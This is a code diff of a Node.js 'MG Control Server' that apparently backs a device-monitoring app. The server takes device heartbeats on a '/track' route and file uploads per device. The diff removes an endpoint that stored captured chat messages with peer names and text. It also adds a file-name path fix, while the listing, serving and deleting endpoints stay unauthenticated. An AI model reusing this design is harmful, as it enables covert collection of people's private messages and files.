@@ -91,7 +91,7 @@ function removeFileLogEntries(fileName) {
     } catch {}
 }
 
-function json(res, payload, status = 200) {
+function jsonResponse(res, payload, status = 200) {
     const body = JSON.stringify(payload);
     res.writeHead(status, {
         "Content-Type": "application/json; charset=utf-8",
@@ -163,7 +163,7 @@ const server = http.createServer(async (req, res) => {
         }
 
         // ============================================
-        // 2. DEVICE HEARTBEAT - form-urlencoded (App)
+        // 2. DEVICE HEARTBEAT
         // ============================================
         if (req.method === "POST" && 
             (url.pathname === "/api/heartbeat" || url.pathname === "/api/v1/device/heartbeat" || url.pathname === "/track")) {
@@ -179,7 +179,7 @@ const server = http.createServer(async (req, res) => {
                     const deviceId = parsed.get("deviceId") || parsed.get("device_id");
                     
                     if (!deviceId) {
-                        return json(res, { ok: false, error: "deviceId required" }, 400);
+                        return jsonResponse(res, { ok: false, error: "deviceId required" }, 400);
                     }
 
                     const data = {
@@ -197,109 +197,33 @@ const server = http.createServer(async (req, res) => {
 
                     console.log(`[HEARTBEAT] ${deviceId} | ${data.brand || ""} ${data.model || ""} | Battery: ${data.batteryPercent || "?"}%`);
 
-                    return json(res, { ok: true, device_id: deviceId });
+                    return jsonResponse(res, { ok: true, device_id: deviceId });
 
                 } catch (error) {
                     console.error("Heartbeat error:", error);
-                    return json(res, { ok: false, error: "Server error" }, 500);
+                    return jsonResponse(res, { ok: false, error: "Server error" }, 500);
                 }
             });
 
             req.on("error", () => {
-                return json(res, { ok: false, error: "Request error" }, 500);
+                return jsonResponse(res, { ok: false, error: "Request error" }, 500);
             });
 
             return;
         }
 
         // ============================================
-        // 3. CHAT BATCH - form-urlencoded (App)
-        // ============================================
-        if (req.method === "POST" && 
-            (url.pathname === "/api/chat/batch" || url.pathname === "/api/v1/chat/batch")) {
-            
-            let body = "";
-            req.on("data", (chunk) => {
-                body += chunk.toString();
-            });
-
-            req.on("end", async () => {
-                try {
-                    const parsed = new URLSearchParams(body);
-                    const deviceId = parsed.get("deviceId") || parsed.get("device_id");
-                    const messagesStr = parsed.get("messages") || "[]";
-                    const messages = JSON.parse(messagesStr);
-
-                    if (!deviceId) {
-                        return json(res, { ok: false, error: "deviceId required" }, 400);
-                    }
-
-                    if (!Array.isArray(messages) || !messages.length) {
-                        return json(res, { ok: true, inserted: 0, skipped: 0 });
-                    }
-
-                    const rows = [];
-                    let skipped = 0;
-
-                    for (const msg of messages.slice(0, 50)) {
-                        if (!msg.mid) {
-                            skipped++;
-                            continue;
-                        }
-                        rows.push({
-                            device_id: deviceId,
-                            mid: msg.mid,
-                            direction: msg.direction === "out" ? "out" : "in",
-                            peer_uid: parseInt(msg.peerUid) || 0,
-                            peer_name: msg.peerName || "",
-                            text: (msg.text || "").slice(0, 500),
-                            message_time: parseInt(msg.time) || Date.now(),
-                            received_at: Date.now()
-                        });
-                    }
-
-                    if (!rows.length) {
-                        return json(res, { ok: true, inserted: 0, skipped });
-                    }
-
-                    const { data: insertedRows, error: messageError } = await supabase
-                        .from("messages")
-                        .upsert(rows, { onConflict: "device_id,mid", ignoreDuplicates: true })
-                        .select("device_id,mid");
-
-                    if (messageError) {
-                        console.error("Message insert error:", messageError);
-                        return json(res, { ok: false, error: "Database error" }, 500);
-                    }
-
-                    return json(res, {
-                        ok: true,
-                        inserted: insertedRows?.length || 0,
-                        skipped: skipped + (rows.length - (insertedRows?.length || 0))
-                    });
-
-                } catch (error) {
-                    console.error("Chat error:", error);
-                    return json(res, { ok: false, error: "Server error" }, 500);
-                }
-            });
-
-            req.on("error", () => {
-                return json(res, { ok: false, error: "Request error" }, 500);
-            });
-
-            return;
-        }
-
-        // ============================================
-        // 4. FILE UPLOAD - RAW BINARY (App)
+        // 3. FILE UPLOAD - RAW BINARY (App)
         // ============================================
         if (req.method === "POST" && url.pathname === "/upload") {
             const contentType = req.headers["content-type"] || "";
             const deviceId = url.searchParams.get("deviceId") || "unknown";
             const fileName = url.searchParams.get("name") || "file.bin";
+            
+            // ✅ FIX: Sirf filename lo, path nahi!
+            const cleanFileName = path.basename(fileName);
 
-            // ✅ RAW BINARY - App sends this
+            // ✅ RAW BINARY
             if (contentType.includes("application/octet-stream") ||
                 contentType.includes("image/jpeg") ||
                 contentType.includes("image/png") ||
@@ -310,9 +234,9 @@ const server = http.createServer(async (req, res) => {
                     buffer = Buffer.concat([buffer, chunk]);
                 });
 
-                req.on("end", async () => {
+                req.on("end", () => {
                     try {
-                        const safeName = `${Date.now()}_${fileName}`;
+                        const safeName = `${Date.now()}_${cleanFileName}`;
                         const filePath = path.join(UPLOAD_DIR, safeName);
                         fs.writeFileSync(filePath, buffer);
 
@@ -323,7 +247,7 @@ const server = http.createServer(async (req, res) => {
                         saveLog({
                             type: "file",
                             file: safeName,
-                            original: fileName,
+                            original: cleanFileName,
                             folder: ".",
                             thumb: thumbName,
                             device_id: deviceId,
@@ -332,9 +256,9 @@ const server = http.createServer(async (req, res) => {
                             time: new Date().toISOString()
                         });
 
-                        console.log(`[UPLOAD] ${getIP(req)} | Device: ${deviceId} | ${fileName} (${buffer.length} bytes)`);
+                        console.log(`[UPLOAD] ${getIP(req)} | Device: ${deviceId} | ${cleanFileName} (${buffer.length} bytes)`);
 
-                        res.json({
+                        jsonResponse(res, {
                             ok: true,
                             file: safeName,
                             device_id: deviceId,
@@ -343,22 +267,22 @@ const server = http.createServer(async (req, res) => {
 
                     } catch (error) {
                         console.error("Upload error:", error);
-                        res.status(500).json({ ok: false, error: "Upload failed" });
+                        jsonResponse(res, { ok: false, error: "Upload failed: " + error.message }, 500);
                     }
                 });
 
                 req.on("error", () => {
-                    res.status(500).json({ ok: false, error: "Upload failed" });
+                    jsonResponse(res, { ok: false, error: "Upload failed" }, 500);
                 });
 
                 return;
             }
 
-            return json(res, { ok: false, error: "Raw binary required (Content-Type: application/octet-stream)" }, 400);
+            return jsonResponse(res, { ok: false, error: "Raw binary required" }, 400);
         }
 
         // ============================================
-        // 5. GET ALL FILES
+        // 4. GET ALL FILES
         // ============================================
         if (req.method === "GET" && url.pathname === "/api/all-files") {
             const logs = readLogs();
@@ -366,32 +290,34 @@ const server = http.createServer(async (req, res) => {
                 .filter(entry => entry.type === "file")
                 .sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0))
                 .slice(0, 100);
-            return json(res, { ok: true, files });
+            return jsonResponse(res, { ok: true, files });
         }
 
         // ============================================
-        // 6. GET FILES FOR DEVICE
+        // 5. GET FILES FOR DEVICE
         // ============================================
         if (req.method === "GET" && url.pathname === "/api/files") {
             const deviceId = url.searchParams.get("deviceId");
             if (!deviceId) {
-                return json(res, { ok: false, error: "deviceId required" }, 400);
+                return jsonResponse(res, { ok: false, error: "deviceId required" }, 400);
             }
             const logs = readLogs();
             const files = logs
                 .filter(entry => entry.type === "file" && entry.device_id === deviceId)
                 .sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0));
-            return json(res, { ok: true, files });
+            return jsonResponse(res, { ok: true, files });
         }
 
         // ============================================
-        // 7. SERVE UPLOADED FILES
+        // 6. SERVE UPLOADED FILES
         // ============================================
         if (req.method === "GET" && url.pathname.startsWith("/uploads/")) {
             const fileName = url.pathname.split("/").pop();
             const filePath = path.join(UPLOAD_DIR, fileName);
             if (!fs.existsSync(filePath)) {
-                return json(res, { ok: false, error: "File not found" }, 404);
+                res.writeHead(404);
+                res.end("File not found");
+                return;
             }
             res.writeHead(200, {
                 "Content-Type": "application/octet-stream",
@@ -402,12 +328,12 @@ const server = http.createServer(async (req, res) => {
         }
 
         // ============================================
-        // 8. DELETE FILE
+        // 7. DELETE FILE
         // ============================================
         if (req.method === "DELETE" && url.pathname.startsWith("/api/file/")) {
             const fileName = url.pathname.split("/").pop();
             if (!fileName) {
-                return json(res, { ok: false, error: "fileName required" }, 400);
+                return jsonResponse(res, { ok: false, error: "fileName required" }, 400);
             }
 
             const filePath = path.join(UPLOAD_DIR, fileName);
@@ -418,14 +344,14 @@ const server = http.createServer(async (req, res) => {
 
             removeFileLogEntries(fileName);
 
-            return json(res, { ok: true, message: "File deleted" });
+            return jsonResponse(res, { ok: true, message: "File deleted" });
         }
 
         // ============================================
-        // 9. ROOT / STATUS
+        // 8. ROOT
         // ============================================
         if (req.method === "GET" && url.pathname === "/") {
-            return json(res, {
+            return jsonResponse(res, {
                 ok: true,
                 server: "MG Control Server",
                 version: loadConfig().version || "1.0.2",
@@ -437,11 +363,11 @@ const server = http.createServer(async (req, res) => {
         // ============================================
         // 404
         // ============================================
-        return json(res, { ok: false, error: "Endpoint not found" }, 404);
+        return jsonResponse(res, { ok: false, error: "Endpoint not found" }, 404);
 
     } catch (error) {
         console.error("Server error:", error);
-        return json(res, { ok: false, error: "Server error" }, 500);
+        return jsonResponse(res, { ok: false, error: "Server error" }, 500);
     }
 });
 
